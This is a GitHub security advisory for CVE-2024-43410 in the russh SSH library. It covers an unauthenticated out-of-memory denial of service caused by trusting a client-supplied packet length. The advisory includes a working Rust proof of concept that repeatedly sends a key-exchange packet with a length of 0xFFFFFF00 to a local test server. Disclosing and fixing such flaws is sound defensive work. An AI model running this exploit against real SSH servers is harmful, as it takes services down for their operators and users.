# [H] Russh has an OOM Denial of Service due to allocation of untrusted amount

## Summary
Severity: High
Advisory: GHSA-vgvv-x7xg-6cqg
CVE: CVE-2024-43410
CWE: CWE-770
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-08-14
Source: https://github.com/advisories/GHSA-vgvv-x7xg-6cqg
Type: github-advisory

## Affected
- crates.io: `russh` — affected >=0 <0.44.1

## Details
### Summary

Allocating an untrusted amount of memory allows any unauthenticated user to OOM a russh server.

### Details

An SSH packet consists of a 4-byte big-endian length, followed by a byte stream of this length.
After parsing and potentially decrypting the 4-byte length, russh allocates enough memory for this bytestream, as a performance optimization to avoid reallocations later.

https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254

But this length is entirely untrusted and can be set to any value by the client, causing this much memory to be allocated, which will cause the process to OOM within a few such requests.

RFC 4253 contains an explicit section on packet length limits: https://datatracker.ietf.org/doc/html/rfc4253#section-6.1

> However, implementations SHOULD check that the packet length is reasonable in order for the implementation to avoid denial of service and/or buffer overflow attacks.

### PoC

Running the `echoserver` example on port 2222 (`cd russh && cargo run --release --example echoserver`), the provided Rust program can be executed against this echoserver and will cause it to OOM within a few tries.

<details>
<summary>Rust code to run against the echo server</summary>

`Cargo.toml`
```toml
[package]
name = "poc"
version = "0.1.0"
edition = "2021"

[dependencies]
hex-literal = "=0.4.1"
```

`main.rs`
```rust
use std::time::Duration;
use std::{error::Error, net::SocketAddr};

use std::{
    io::{Read, Write},
    net::TcpStream,
};

fn main() -> Result<(), Box<dyn Error>> {
    loop {
        attempt()?;
        eprintln!("still running, trying again in a few seconds");
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn attempt() -> Result<(), Box<dyn Error>> {
    for i in 0..5 {
        eprintln!("iteration {i}");
        let mut s = TcpStream::connect("0.0.0.0:2222".parse::<SocketAddr>().unwrap())?;
        s.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
        s.read(&mut [0; 1000])?;
        // A KeyExchangeInit copied from an OpenSSH client run but the length has been replaced with 0xFFFFFF00.
        s.write_all(&hex_literal::hex!(
            "
        ffffff00071401af35150e67f2bc6dc4bc6b5330901900000131736e74727570373631783235353
        1392d736861353132406f70656e7373682e636f6d2c637572766532353531392d7368613235362c
        637572766532353531392d736861323536406c69627373682e6f72672c656364682d736861322d6
        e697374703235362c656364682d736861322d6e697374703338342c656364682d736861322d6e69
        7374703532312c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d73686
        13235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669
        652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2
        d67726f757031342d7368613235362c6578742d696e666f2d632c6b65782d7374726963742d632d
        763030406f70656e7373682e636f6d000001cf7373682d656432353531392d636572742d7630314
        06f70656e7373682e636f6d2c65636473612d736861322d6e697374703235362d636572742d7630
        31406f70656e7373682e636f6d2c65636473612d736861322d6e697374703338342d636572742d7
        63031406f70656e7373682e636f6d2c65636473612d736861322d6e697374703532312d63657274
        2d763031406f70656e7373682e636f6d2c736b2d7373682d656432353531392d636572742d76303
        1406f70656e7373682e636f6d2c736b2d65636473612d736861322d6e697374703235362d636572
        742d763031406f70656e7373682e636f6d2c7273612d736861322d3531322d636572742d7630314
        06f70656e7373682e636f6d2c7273612d736861322d3235362d636572742d763031406f70656e73
        73682e636f6d2c7373682d656432353531392c65636473612d736861322d6e697374703235362c6
        5636473612d736861322d6e697374703338342c65636473612d736861322d6e697374703532312c
        736b2d7373682d65643235353139406f70656e7373682e636f6d2c736b2d65636473612d7368613
        22d6e69737470323536406f70656e7373682e636f6d2c7273612d736861322d3531322c7273612d
        736861322d3235360000006c63686163686132302d706f6c7931333035406f70656e7373682e636
        f6d2c6165733132382d6374722c6165733139322d6374722c6165733235362d6374722c61657331
        32382d67636d406f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636
        f6d0000006c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c61657331
        32382d6374722c6165733139322d6374722c6165733235362d6374722c6165733132382d67636d4
        06f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636f6d000000d575
        6d61632d36342d65746d406f70656e7373682e636f6d2c756d61632d3132382d65746d406f70656
        e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c68
        6d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861312d6
        5746d406f70656e7373682e636f6d2c756d61632d3634406f70656e7373682e636f6d2c756d6163
        2d313238406f70656e7373682e636f6d2c686d61632d736861322d3235362c686d61632d7368613
        22d3531322c686d61632d73686131000000d5756d61632d36342d65746d406f70656e7373682e63
        6f6d2c756d61632d3132382d65746d406f70656e7373682e636f6d2c686d61632d736861322d323
        5362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322d65746d406f7065
        6e7373682e636f6d2c686d61632d736861312d65746d406f70656e7373682e636f6d2c756d61632
        d3634406f70656e7373682e636f6d2c756d61632d313238406f70656e7373682e636f6d2c686d61
        632d736861322d3235362c686d61632d736861322d3531322c686d61632d736861310000001a6e6
        f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f
        70656e7373682e636f6d2c7a6c69620000000000000000000000000000000000000000
        "
        ))?;

        s.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}
```

</details>

### Impact

Due to this allocation, a russh server can be brought to OOM, causing a DoS.
Since this happens before authentication, it can be done by any user that has access to the TCP port over the internet.

## References
- https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg
- https://nvd.nist.gov/vuln/detail/CVE-2024-43410
- https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55
- https://github.com/Eugeny/russh
